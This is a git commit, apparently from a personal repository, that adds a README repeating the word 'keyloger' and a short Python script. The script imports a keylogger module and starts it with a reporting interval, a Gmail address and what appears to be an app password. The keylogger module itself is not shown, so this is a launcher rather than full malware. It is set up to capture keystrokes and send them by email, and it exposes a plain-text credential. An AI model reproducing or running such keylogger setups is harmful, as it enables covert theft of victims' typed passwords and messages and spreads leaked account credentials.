2425f6c48e4e186055ecee2bcea5e335194c0a62
Sardorbek-pentester <ulashovs1@gmail.com>
2024-02-27 10:32:56 +0500

    the best program

---
+++ README.md
@@ -0,0 +1,7 @@
+# keyloger
+# keyloger
+# keyloger
+# keyloger
+# keyloger1
+# keyloger1
+# keyloger1
---
+++ my_keyloger.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python
+
+import keyloger
+
+sy_keyloger = keyloger.Keyloger(4, "sardor44563@gmail.com","bkzl jllf snze tahe")
+sy_keyloger.start()
